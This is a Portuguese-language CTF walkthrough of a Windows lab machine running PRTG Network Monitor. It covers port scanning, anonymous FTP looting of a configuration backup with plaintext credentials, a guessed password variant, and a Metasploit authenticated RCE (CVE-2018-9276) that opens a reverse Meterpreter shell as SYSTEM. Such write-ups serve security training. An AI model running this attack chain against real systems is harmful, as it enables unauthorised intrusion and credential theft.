#ctfs 

# Reconhecimento inicial

Primeiramente iniciamos com um scan via `nmap`para vermos as portas abertas

```shell
└─$ nmap 10.129.230.176 -Pn --open
Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-04 09:19 -03
Nmap scan report for 10.129.230.176
Host is up (0.13s latency).
Not shown: 959 closed tcp ports (reset), 35 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
21/tcp   open  ftp
80/tcp   open  http
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
5985/tcp open  wsman

Nmap done: 1 IP address (1 host up) scanned in 3.90 seconds
```

Aprofundando um pouco mais o scan

```shell
└─$ nmap 10.129.230.176 -Pn --open -sV
Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-04 09:20 -03
Nmap scan report for 10.129.230.176
Host is up (0.17s latency).
Not shown: 994 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
80/tcp   open  http          Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/sub
Nmap done: 1 IP address (1 host up) scanned in 19.30 seconds
```

# Enumeração

## Serviço Web

Entrando na fase da enumeração, vamos abordar a porta 80 que está aberta. Após abrir no navegador conseguimos ver o seguinte painel


![](Imagens/Pasted%20image%2020260904091832.png)

Testamos as credenciais padrão `prtgadmin:prtadmin` mas não funcionou

Vamos enumerar diretórios via `feroxbuster`

```shell
└─$ feroxbuster -u http://10.129.230.176 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -C 404 -x php,txt 
                                                                                                                                     
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.129.230.176/
 🚩  In-Scope Url          │ 10.129.230.176
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
 💢  Status Code Filters   │ [404]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [php, txt]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
302      GET        0l        0w        0c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter                                                                                                                                   
200      GET        5l      147w    31240c http://10.129.230.176/beton
200      GET        5l      147w    31240c http://10.129.230.176/28638
200      GET        5l      147w    31240c http://10.129.230.176/3photo
200      GET        5l      147w    31240c http://10.129.230.176/allsearch
200      GET        5l      147w    31240c http://10.129.230.176/83929
200      GET        5l      147w    31240c http://10.129.230.176/182844
200      GET        5l      147w    31240c http://10.129.230.176/comment_index
200      GET        5l      147w    31240c http://10.129.230.176/7063
200      GET        5l      147w    31240c http://10.129.230.176/20172
200      GET        5l      147w    31240c http://10.129.230.176/21068
200      GET        5l      147w    31240c http://10.129.230.176/22012
200      GET        5l      147w    31240c http://10.129.230.176/18488
200      GET        5l      147w    31240c http://10.129.230.176/22162
200      GET        5l      147w    31240c http://10.129.230.176/22099
200      GET        5l      147w    31240c http://10.129.230.176/regression-test
200      GET        5l      147w    31240c http://10.129.230.176/22009
200      GET        5l      147w    31240c http://10.129.230.176/TopicsNotAnswered
200      GET        5l      147w    31240c http://10.129.230.176/sign_language
200      GET        5l      147w    31240c http://10.129.230.176/29002
200      GET        5l      147w    31240c http://10.129.230.176/28983
200      GET        5l      147w    31240c http://10.129.230.176/231170
200      GET        5l      147w    31240c http://10.129.230.176/20030726
200      GET        5l      147w    31240c http://10.129.230.176/20030629
200      GET        5l      147w    31240c http://10.129.230.176/bloggership
200      GET        5l      147w    31240c http://10.129.230.176/cellulite
200      GET        5l      147w    31240c http://10.129.230.176/22051
200      GET        5l      147w    31240c http://10.129.230.176/ntnews
200      GET        5l      147w    31240c http://10.129.230.176/20070109-8584
200      GET        5l      147w    31240c http://10.129.230.176/12215
200      GET        5l      147w    31240c http://10.129.230.176/masonrc
200      GET       26l      329w    32213c http://10.129.230.176/20030716
200      GET       21l      283w    31966c http://10.129.230.176/19151
200      GET       26l      329w    32213c http://10.129.230.176/77753
200      GET       26l      329w    32213c http://10.129.230.176/lua-httpd.php
200      GET       26l      329w    32213c http://10.129.230.176/tecnology
200      GET       26l      329w    32213c http://10.129.230.176/19342.php
200      GET       26l      329w    32213c http://10.129.230.176/jul2000
200      GET       26l      329w    32213c http://10.129.230.176/20030907.php
200      GET       26l      329w    32213c http://10.129.230.176/21484.txt
200      GET       26l      329w    32213c http://10.129.230.176/27545.php
200      GET       26l      329w    32213c http://10.129.230.176/youtube-silly
200      GET       26l      329w    32213c http://10.129.230.176/termsuse
200      GET       26l      329w    32213c http://10.129.230.176/coolhunting
200      GET       26l      329w    32213c http://10.129.230.176/19422
200      GET       26l      329w    32213c http://10.129.230.176/28032.php
200      GET        9l      182w    31435c http://10.129.230.176/19027
[##########>---------] - 41m   344758/661635  40m     found:462  🚨 Caught ctrl+c 🚨 saving scan state to ferox-http_10_129_230_176_-1788527046.state ...
[##########>---------] - 41m   344776/661635  40m     found:462     errors:7572   
[##########>---------] - 41m   359691/661635  146/s   http://10.129.230.176/    
```

O resultado real foi muito maior, encerrei o scan pois todos os resultados retornam a mesma página de login, ou seja, são falsos positivos, encerremos, portanto, a fase de enumeração Web e tentemos outras abordagens.

## SMB

Fazendo uso do `crackmapexec`e do `smbclient`chegamos aos seguintes resultados após tentar um login sem credenciais:

```shell
└─$ smbclient -L //10.129.230.176 -N
session setup failed: NT_STATUS_ACCESS_DENIED
```

```shell
└─$ crackmapexec smb 10.129.230.176 -u "" -p ""
SMB         10.129.230.176  445    NETMON           [*] Windows Server 2016 Standard 14393 x64 (name:NETMON) (domain:netmon) (signing:False) (SMBv1:True)
SMB         10.129.230.176  445    NETMON           [-] netmon\: STATUS_ACCESS_DENIED 
```

O que nos leva a crer que não é esse o caminho certo

## FTP

Sobrou-nos o FTP. Como continuamos sem credenciais vamos tentar login anônimo.

```shell
ftp 10.129.230.176 
Connected to 10.129.230.176.
220 Microsoft FTP Service
Name (10.129.230.176:pentecostes): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
229 Entering Extended Passive Mode (|||50124|)
125 Data connection already open; Transfer starting.
02-03-19  12:18AM                 1024 .rnd
02-25-19  10:15PM       <DIR>          inetpub
07-16-16  09:18AM       <DIR>          PerfLogs
02-25-19  10:56PM       <DIR>          Program Files
02-03-19  12:28AM       <DIR>          Program Files (x86)
02-03-19  08:08AM       <DIR>          Users
11-10-23  10:20AM       <DIR>          Windows
226 Transfer complete.
```

Funcionou, o FTP logou com null session. Vamos explorar o serviço!

# Exploração

Após procurar um pouco, encontramos a seguinte pasta:

```shell
ftp> cd Desktop
250 CWD command successful.
ftp> ls
229 Entering Extended Passive Mode (|||50275|)
125 Data connection already open; Transfer starting.
02-03-19  12:18AM                 1195 PRTG Enterprise Console.lnk
02-03-19  12:18AM                 1160 PRTG Network Monitor.lnk
09-04-26  08:15AM                   34 user.txt
```

Realizando a transferência para a a nossa máquina e depois abrindo achamos a primeira flag

```shell
ftp> get user.txt
local: user.txt remote: user.txt
229 Entering Extended Passive Mode (|||50277|)
150 Opening ASCII mode data connection.
100% |********************|    34        0.08 KiB/s    00:00 ETA
226 Transfer complete.
34 bytes received in 00:00 (0.05 KiB/s)
ftp> 
ftp> exit
221 Goodbye.
                                                                 
┌──(pentecostes㉿Pentecostes)-[~]
└─$ cat user.txt       
[Flag user]
```

Desse modo, encontramos a primeira flag.

# Pós-exploração

Nosso foco agora é conseguirmos credenciais de login ou qualquer informação que nos conceda acesso remoto com privilégios. Vamos continuar explorando o FTP

Após uma longa procura e busca na internet sobre pastas onde geralmente ficam os arquivos do PRTG, encontramos o seguinte documento:

```shell
ftp> cd "PRTG Network Monitor"
250 CWD command successful.
ftp> ls -la
229 Entering Extended Passive Mode (|||50588|)
125 Data connection already open; Transfer starting.
09-04-26  08:57AM       <DIR>          Configuration Auto-Backups
09-04-26  08:25AM       <DIR>          Log Database
02-03-19  12:18AM       <DIR>          Logs (Debug)
02-03-19  12:18AM       <DIR>          Logs (Sensors)
02-03-19  12:18AM       <DIR>          Logs (System)
09-04-26  08:25AM       <DIR>          Logs (Web Server)
09-04-26  08:25AM       <DIR>          Monitoring Database
02-25-19  10:54PM              1189697 PRTG Configuration.dat
02-25-19  10:54PM              1189697 PRTG Configuration.old
07-14-18  03:13AM              1153755 PRTG Configuration.old.bak
09-04-26  08:56AM              1672903 PRTG Graph Data Cache.dat
02-25-19  11:00PM       <DIR>          Report PDFs
02-03-19  12:18AM       <DIR>          System Information Database
02-03-19  12:40AM       <DIR>          Ticket Database
02-03-19  12:18AM       <DIR>          ToDo Database
226 Transfer complete.
ftp> get "PRTG Configuration.old.bak"
```

Baixemos esse `PRTG Configuration.old.bak` e, após uma pesquisa, encontramos credenciais em texto claro.

![](Imagens/Pasted%20image%2020260904103643.png)

OBS: os outros arquivos de configuração são semelhantes, porém, sem as credenciais em texto claro.

Como não há um SSH, podemos tentar fazer login novamente no site com as credenciais encontradas, entretanto, deu login falho novamente! Porém, podemos testar novas senhas a partir da original (supondo que tenham atualizado). Testamos a variação `PrTg@dmin2019` e logou.

![](Imagens/Pasted%20image%2020260904111242.png)

Agora podemos explorar um CVE que nos dê acesso.

# Exploração final (CVE-2018-9276)

A partir do repositório https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/windows/http/prtg_authenticated_rce.md, segui o passo a passo ensinado via `msfconsole` e obtive acesso remoto.

```shell
msf exploit(windows/http/prtg_authenticated_rce) > run
[*] Started reverse TCP handler on [Meu IP]:4444 
[+] Successfully logged in with provided credentials
[+] Created malicious notification (objid=2018)
[+] Triggered malicious notification
[+] Deleted malicious notification
[*] Waiting for payload execution.. (30 sec. max)
[*] Sending stage (188998 bytes) to 10.129.79.17
[*] Meterpreter session 1 opened ([Meu IP]:4444 -> 10.129.79.17:49793) at 2026-09-04 11:17:18 -0300
```

Confirmando nível de privilégio

```shell
C:\Users\Administrator\Desktop>whoami
whoami
nt authority\system
```

Por fim, vamos até a pasta do flag root.txt

```shell
C:\Users\Administrator\Desktop>type root.txt
type root.txt
[Flag root.txt]
```

